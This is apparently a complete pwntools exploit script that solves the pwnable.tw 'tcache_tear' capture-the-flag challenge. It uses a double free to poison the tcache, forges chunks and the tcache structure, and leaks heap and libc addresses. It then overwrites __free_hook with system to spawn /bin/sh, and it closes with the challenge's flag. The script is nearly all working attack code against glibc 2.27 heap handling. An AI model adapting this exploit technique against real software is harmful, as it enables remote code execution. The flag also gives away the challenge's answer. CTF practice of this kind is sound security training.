#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './tcache_tear')
#libc = ELF("/home/noam/.cache/.pwntools-cache-3.12/libcdb_libs/b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0/libc-2.27.so")
libc = ELF('./libc.so.6') 

### config ###
host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10207)

### defines ###3
username_addr = exe.sym.stderr + 0x20
ptr_addr = exe.sym.stderr + 0x48

### globals ###
OW_CHUNK_SIZE = p64(ptr_addr)#p64(0x0000602000)#p64(ptr_addr) #start of data section

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

### wrappers ###
def option(io: process, op: int):
    io.sendlineafter("choice :", str(op))

def malloc(io: process, size: int = 0x18, data: str = ''):
    option(io, 1)
    io.sendlineafter("Size:", str(size))
    io.sendlineafter("Data:", data)

def free(io: process):
    option(io, 2)

def info(io: process):
    option(io, 3)
    return io.recvuntil('$')[6:-1]

### helpers ### 
def gen_fake_chk(size: int, prev_size: int = 0, flags: int = 1, fd: int = 0, bk: int = 0):
    if size < 0x20:
        return
    fake_chk  = p64(prev_size) + p64(size | flags)
    fake_chk += p64(fd) + p64(bk)
    fake_chk += cyclic(size - 0x20)

def gen_tcache_struct(entries: list, max_size: int):
    buf = bytearray(max_size)

    for e in entries:
        idx = (e["size"] - 0x10) // 0x10

        # compose the per-bin mini-structure
        st  = b"\x00" * idx
        st += p8(e["amnt"])
        st += b"\x00" * (55 - idx)
        st += p64(0) * idx
        st += p64(e["addr"])

        # overlay onto main buffer
        for i, ch in enumerate(st):
            if ch != 0 and i < max_size:
                buf[i] = ch

    return bytes(buf)

# -- Exploit goes here --

def main():
    ### run ###
    io = start()
     
    ### setup ###
    io.sendlineafter("Name:", OW_CHUNK_SIZE)
    
    ### exploit ###
    malloc(io, 0x18) #prepare chunk for heap leak
    free(io)

    malloc(io, 0xf8)
    free(io)
    free(io)
    malloc(io, 0xf8, p64(username_addr)) #overwrite fd with username addr
    malloc(io, 0xf8)

    fake_chk = p64(0) + p64(0x20 | 1) #prepare fake chunk on username
    malloc(io, 0xf8, fake_chk + cyclic(ptr_addr - username_addr - len(fake_chk)) + p64(username_addr+0x10)) #overwrite ptr with username fake chunk
    free(io)

    heap = (u64(info(io)[0x10:][:8]) - 0x10) - 0x250 #sub chunk_metadata & tcache struct size
    log.info(f"heap @ {hex(heap)}")
    
    free(io)
    malloc(io, 0x18, p64(heap + 0x10)) #point to the tcache struct
    malloc(io, 0xf8)
    malloc(io, 0xf8)
    tcache_entrys = [{
        "size": 0x100,
        "amnt": 1,
        "addr": heap+0x10 #tcache struct

    },
    {
        "size": 0xf0,
        "amnt": 1,
        "addr": username_addr
    },
    {
        "size": 0xe0,
        "amnt": 2,
        "addr": exe.sym.stdin
    },
    {
        "size": 0xd0,
        "amnt": 1,
        "addr": username_addr+0x10
    }]
    malloc(io, 0xf8, gen_tcache_struct(tcache_entrys, 0xe8)) #edit tcache struct
    
    malloc(io, 0xd0)#write libc addr on tcache bin
    fake_chk = p64(0) + p64(0xe0)
    malloc(io, 0xe0, fake_chk)
    malloc(io, 0xc0)
    free(io)
    log.info(f"stdin @ {hex(libc.sym.stdin)}")
    libc.address = u64(info(io)[0x10:][:8]) - libc.sym.stdin + 0xe50 #distance from the libc struct itself
    log.info(f"libc @ {hex(libc.address)}")

    tcache_entrys = [{
        "size": 0x20,
        "amnt": 1,
        "addr": libc.sym.__free_hook
    }]
    malloc(io, 0xf8, gen_tcache_struct(tcache_entrys, 0xe8)) #edit tcache struct

    malloc(io, 0x18, p64(libc.sym.system))
    malloc(io, 0x18, b"/bin/sh\0")
    free(io)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: FLAG{tc4ch3_1s_34sy_f0r_y0u}
